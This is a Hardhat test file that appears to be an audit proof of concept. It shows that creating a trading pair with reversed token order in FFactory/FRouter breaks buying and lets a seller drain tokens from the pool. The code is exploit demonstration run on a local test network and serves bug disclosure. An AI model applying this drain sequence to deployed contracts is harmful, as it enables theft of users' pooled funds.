const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { MaxUint256, parseEther, formatEther } = require("ethers");

describe("POC-Wrong pair registration will break buy/sell flow", function () {
  // Helper function to get signers/accounts
  const getAccounts = async () => {
    const [deployer, creator, executor, admin, user, taxVault] =
      await ethers.getSigners();
    return {
      deployer,
      creator,
      executor,
      admin,
      user,
      taxVault,
    };
  };

  // Basic fixture that deploys the core contracts
  async function deployBaseFixture() {
    const { deployer, creator, executor, admin, taxVault } =
      await getAccounts();

    const FERC20 = await ethers.getContractFactory("FERC20");
    const token = await FERC20.connect(executor).deploy(
      "Token0",
      "T0",
      1000000,
      100
    );
    const assetToken = await FERC20.connect(executor).deploy(
      "Token1",
      "T1",
      1000000,
      100
    );

    const FFactory = await ethers.getContractFactory("FFactory");
    const factory = await upgrades.deployProxy(
      FFactory,
      [deployer.address, deployer.address, deployer.address],
      {
        initializer: "initialize",
        unsafeAllow: ["constructor", "delegatecall"],
      }
    );

    const FRouter = await ethers.getContractFactory("FRouter");
    const router = await upgrades.deployProxy(
      FRouter,
      [factory.target, assetToken.target],
      {
        initializer: "initialize",
        unsafeAllow: ["constructor", "delegatecall"],
      }
    );

    await factory.grantRole(await factory.CREATOR_ROLE(), creator.address);
    await factory.grantRole(await factory.ADMIN_ROLE(), admin.address);
    await router.grantRole(await router.EXECUTOR_ROLE(), executor.address);
    await factory.connect(admin).setRouter(router.target);
    await factory.connect(admin).setTaxParams(taxVault.address, 1, 1);

    await token.connect(executor).approve(router.target, MaxUint256);
    await assetToken.connect(executor).approve(router.target, MaxUint256);

    return {
      factory,
      router,
      token,
      assetToken,
    };
  }

  it("POC: Wrong pair registration will break buy/sell flow", async function () {
    // Load the fixture
    const { factory, router, token, assetToken } = await loadFixture(
      deployBaseFixture
    );
    const { creator, executor, user } = await getAccounts();

    await factory.connect(creator).createPair(assetToken.target, token.target);

    // 1 TOKEN = 0.5 ASSET TOKEN
    await router
      .connect(executor)
      .addInitialLiquidity(token.target, parseEther("100"), parseEther("200"));

    const assetAmountIn = parseEther("20");

    await assetToken.connect(executor).transfer(user.address, assetAmountIn);

    await assetToken.connect(user).approve(router.target, MaxUint256);

    await router
      .connect(executor)
      .buy(assetAmountIn, token.target, user.address);

    console.log(
      "!!!User did not received token after buy, and he received",
      formatEther(await assetToken.balanceOf(user.address)),
      "asset token."
    );

    expect(await token.balanceOf(user.address)).to.not.eq(0);
  });

  it("POC: Wrong pair registration could allow attacker to drain token from pool", async function () {
    // Load the fixture
    const { factory, router, token, assetToken } = await loadFixture(
      deployBaseFixture
    );
    const { creator, executor, user } = await getAccounts();

    await factory.connect(creator).createPair(assetToken.target, token.target);

    await router
      .connect(executor)
      .addInitialLiquidity(
        token.target,
        parseEther("1000"),
        parseEther("20000")
      );

    const tokenAmountIn = parseEther("20");

    await token.connect(executor).transfer(user.address, tokenAmountIn);

    await token.connect(user).approve(router.target, MaxUint256);

    console.log(
      "User's token balance before sell:",
      formatEther(await token.balanceOf(user.address))
    );

    // Drain token from pair with sell function.
    await router
      .connect(executor)
      .sell(tokenAmountIn, token.target, user.address);

    console.log(
      "User's token balance after sell:",
      formatEther(await token.balanceOf(user.address))
    );
  });
});
